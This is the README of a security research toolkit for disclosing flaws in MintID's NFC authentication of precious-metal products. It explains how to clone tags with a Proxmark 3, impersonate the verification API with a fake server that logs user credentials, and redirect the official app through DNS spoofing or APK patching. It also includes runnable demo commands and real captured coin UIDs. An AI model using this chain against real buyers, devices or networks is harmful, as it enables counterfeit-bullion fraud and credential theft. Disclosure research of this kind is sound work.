# MintID Interoperability Research Toolkit

DMCA §1201(f) interoperability research on MintID NFC-tagged precious-metal authentication. Tested against coins owned by the researcher.

The toolkit demonstrates a full clone-and-tap chain:

1. **Capture** a genuine coin's (UID, NDEF) via PC/SC NFC reader → persist to local oracle DB
2. **Clone** that capture onto a magic NTAG/Ultralight chip via Proxmark 3
3. **Impersonate** the production verification API with a local Flask server seeded from the oracle DB
4. **Redirect** the official iOS app to the local server via DNS spoofing (no app modification needed) — or via APK string-patching for Android
5. **Override** product name, image, serial, description, etc. at the server side and watch the official app render whatever you tell it

End-to-end demonstrated 2026-05-02: official MintID iOS app from the App Store rendered "GENUINE / 1.82 Troy Oz MintID Imperial Credit / Hand crafted elite pwnage pour" with a hand-poured bar photo, against a chip running on someone's research bench, with the phone configured only to use a non-default DNS server.

## What's in the box

```
mintid_simulate.py            Read coin via PC/SC, capture to oracle DB, POST
                              to MintID server. Byte-faithful reproduction of
                              the Android app's verification flow.

mintid_oracle.py              SQLite oracle module (schema, write paths,
                              change detection, summary helpers).
mintid_oracle_cli.py          Inspector for the oracle DB.

mintid_chip_summary.py        Layout-aware passive analysis of NFC dumps.
                              Handles both ntag_standard and cc_at_origin
                              chip layouts (we found both in the wild on
                              the same SKU).

mintid_pm3_clone.py           Proxmark 3 cloning helper. Detect, read,
                              write, verify subcommands.
mintid_capture_and_clone.py   One-shot ACR-capture + PM3-clone + verify
                              workflow.

mintid_fake_server.py         Flask server impersonating MintID's API.
                              Endpoints:
                                POST /api/ProductAuthentication/SecuredScanProduct
                                GET  /api/Document/GetImage?documentID=<id>
                                POST /api/AccountAccess/Login
                                POST /api/AccountAccess/Logout
                                /admin/* (image upload, record listing,
                                          tuple injection, etc.)
                              Accepts both Android-style application/json
                              and iOS-style application/x-www-form-urlencoded
                              on every endpoint. Optional interactive enrolment
                              with countdown-and-auto-genuine on timeout.
                              Optional product/image override flags. Logs raw
                              request bodies AND parsed payloads (UserName,
                              Password, etc.) to stdout.

mintid_dns_spoof.py           Tiny DNS server that resolves
                              mintidapi.droisys.info to a target IP,
                              forwards everything else upstream. Lets
                              the unmodified official iOS app reach the
                              fake server with no app changes.

mintid_apk_repoint.py         APK patcher (Android alternative to DNS
                              spoofing). Length-preserving DEX string
                              patch of the base URL.

mintid_oracle.db              Pre-populated SQLite DB containing three
                              captured coin records:
                                04C3434A9E7384  1oz Buffalo Round    301949
                                04C83E12087484  5oz Buffalo Bar      349418
                                ADF61606013C16E0 1oz Buffalo (clone) 102396

fake_server_images/           Pre-loaded image cache:
                                HAND_POURED_BAR.bin  hand-poured silver bar JPEG

archive/                      One-time analysis scripts kept for disclosure
                              provenance. Not needed for the demo flow.
                              See archive/README.md.

DISCLOSURE_DRAFT.md           Disclosure document with 14 architectural
                              findings, threat model, remediation
                              recommendations.
HANDOFF.md                    State summary for future sessions.
```

## Quick demo: official iOS app shows whatever you tell it

```bash
# Find your laptop's LAN IP
ipconfig getifaddr en0
# e.g. 192.168.0.75

# Terminal 1: DNS spoofer
sudo python3 mintid_dns_spoof.py --target-ip 192.168.0.75

# Terminal 2: fake server with custom product details
sudo python3 mintid_fake_server.py \
    --interactive-enrol \
    --auto-enrol-timeout 5 \
    --default-image-doc-id HAND_POURED_BAR \
    --override-images-globally \
    --serial-number 31337 \
    --product-name "1.82 Troy Oz MintID Imperial Credit" \
    --product-description "Poured May 1st by d0tslash. Artisinally hand crafted elite pwnage pour." \
    --material "1.82 Troy Ounce, and a splash of Unobtainium" \
    --proxy-images

# Phone: set wifi DNS to your laptop's IP, then tap any chip with the
# official MintID app. The GENUINE screen shows your custom strings.
```

If you want to demo the chip-cloning side as well, run `mintid_capture_and_clone.py` with a genuine coin on the ACR1552 and a magic Ultralight-C on the Proxmark 3 antenna.

## Reproduction cost

- Proxmark 3 Easy or RDV4: $50–$60
- Magic NTAG 213 / Ultralight-C UID-modifiable chip: $1–$5
- ACR1552 PC/SC NFC reader (or any NFC-capable phone): $30–$40 (or free)
- Total: under $100 to reproduce every empirical finding in the disclosure

## Caveats

- **Chip cloning is for chips you own.** The toolkit is for interoperability research under DMCA §1201(f). Capturing strangers' coins or substituting clones into commercial transactions is fraud, full stop.
- **Server probes are hard-capped.** All probe scripts include request budgets to avoid impacting production. Don't bypass these caps.
- **DNS spoofing is local-network only.** Running this on someone else's network, or against someone else's phone, isn't research; it's an attack. Stay on your own LAN with your own devices.
- **Disclosure is the goal.** This toolkit exists to back up an architectural-vulnerability disclosure. The intended audience is the vendor's incident-response team, plus future researchers replicating findings. Not buyers or sellers of the affected products.

## Setup

Python ≥ 3.9.

```bash
pip install pyscard flask dnslib
pip install netifaces  # optional, for prettier interface listing

# System tools:
brew install --HEAD proxmark3                       # macOS
apt install python3-pyscard pcscd libpcsclite-dev   # Debian/Ubuntu
```

## Disclosure status

See `DISCLOSURE_DRAFT.md` for the full disclosure with 14 numbered findings. The empirical demonstration is complete: clone-and-tap works end-to-end, official iOS app accepts forged responses, image and product fields are server-controlled with no client-side validation. Mitigation is the next step.

It is recommended that MintID and their stakeholders offer a service by which anyone owning a MintID certified bar can return it, have it authenticated by their staff, and issued a new RFID tag, or packaging. Once the application level mitigations are performed (issue a new app version, and make the server side validatiosn more robust) this tag replacement will *clean* the landscape of questionable RFID TOMs. Any resellers should preemptively work with MintID to replace known questionable, or potentially compromised tags that fall into the pre-disclosure timeline. New bars that are minted should immediately stop using the known flawed tag impelmentation when they are added to the master database. 
